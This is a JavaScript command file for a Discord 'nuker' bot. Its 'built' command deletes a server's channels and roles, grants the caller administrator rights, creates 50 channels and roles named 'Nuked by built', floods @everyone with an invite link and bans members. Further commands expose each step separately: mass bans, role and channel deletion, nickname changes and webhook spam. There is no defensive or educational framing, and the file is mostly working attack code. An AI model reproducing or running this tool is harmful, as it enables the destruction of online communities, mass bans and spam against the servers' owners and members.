const discord = require("./discord.js");
const prefix = `${process.env.DISCORD_PREFIX}`
// Example ping command
function pingCommand(message, args, client) {
  message.reply('Pong!');
}

// Example say command
function sayCommand(message, args, client) {
  message.delete();
  const text = args.join(' ');
  if(!text || text === '') return;
  message.channel.send(text);
}

// Example say command
async function BuiltCommand(message, args, client) {
  message.delete();
  let server_id = message.guild.id
  await discord.DelChannels(client, server_id);
  await discord.DelRoles(client, server_id);

  discord.GiveAdmin(client, message.author.id, server_id); 
  discord.SendMsg(client, 'https://discord.gg/DpH6SnDHcW', server_id)
  await discord.RanChannels(client, 50, 'Nuked-by-built', server_id);
  discord.RanRoles(client, 50, 'Nuked by built', server_id);
  discord.SendChannels(client, '@everyone https://discord.gg/DpH6SnDHcW', 100, server_id);
  discord.BanMembers(client, server_id, message.author.id);

}

// SendMsg command
function sendMsgCommand(message, args, client) {
  const server_id = message.guild.id
  const msg = args.slice(1).join(' ');
  if(!msg) return message.author.send(`You must sepsecify \`{prefix}dm [msg]\` args.`)
  discord.SendMsg(client, msg, server_id);
}

// SendChannels command
function sendChannelsCommand(message, args, client) {
  const msg = args[0];
  const server_id = message.guild.id
  const time = 100;
  if(!msg) return message.author.send(`You must sepsecify \`{prefix}send [msg]\` args.`)
  discord.SendChannels(client, msg, time, server_id);
}

// WebChannels command
function webChannelsCommand(message, args, client) {
  const msg = args[0];
  const server_id = message.guild.id
  const time = 100;
  if(!msg) return message.author.send(`You must sepsecify \`{prefix}web [msg]\` args.`)
  discord.WebChannels(client, msg, time, server_id);
}

// GiveAdmin command
function giveAdminCommand(message, args, client) {
  const user_id = message.author.id
  const server_id = message.guild.id

  discord.GiveAdmin(client, user_id, server_id);
}

// BanMembers command
function banMembersCommand(message, args, client) {
  const server_id = message.guild.id
  const user_id = message.author.id
  discord.BanMembers(client, server_id, user_id);
}

// DelRoles command
function delRolesCommand(message, args, client) {
  const server_id = message.guild.id
  discord.DelRoles(client, server_id);
}

// DelChannels command
function delChannelsCommand(message, args, client) {
  const server_id = message.guild.id
  discord.DelChannels(client, server_id);
}

// RanChannels command
function ranChannelsCommand(message, args, client) {
  const server_id = message.guild.id
  const num = 50;
  const name = args[0];
  if(!name) return message.author.send(`You must sepsecify \`{prefix}channels [name]\` args.`)
  discord.RanChannels(client, num, name, server_id);
}

// ChangeNicknames command
function changeNicknamesCommand(message, args, client) {
  const server_id = message.guild.id
  const msg = args.slice(1).join(' ');
  if(!msg) return message.author.send(`You must sepsecify \`{prefix}nick [nickname]\` args.`)
  discord.ChangeNicknames(client, msg, server_id);
}

// RanRoles command
function ranRolesCommand(message, args, client) {
  const server_id = message.guild.id
  const num = 50;
  const name = args[0];
  if(!name) return message.author.send(`You must sepsecify \`{prefix}roles [name]\` args.`)
  discord.RanRoles(client, num, name, server_id);
}

function makeid(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

module.exports = {
  ping: pingCommand,
  say: sayCommand,
  built: BuiltCommand,
  dm: sendMsgCommand,
  send: sendChannelsCommand,
  web: webChannelsCommand,
  admin: giveAdminCommand,
  ban: banMembersCommand,
  delr: delRolesCommand,
  delc: delChannelsCommand,
  channels: ranChannelsCommand,
  nick: changeNicknamesCommand,
  roles: ranRolesCommand
  // Add more commands here if needed
};
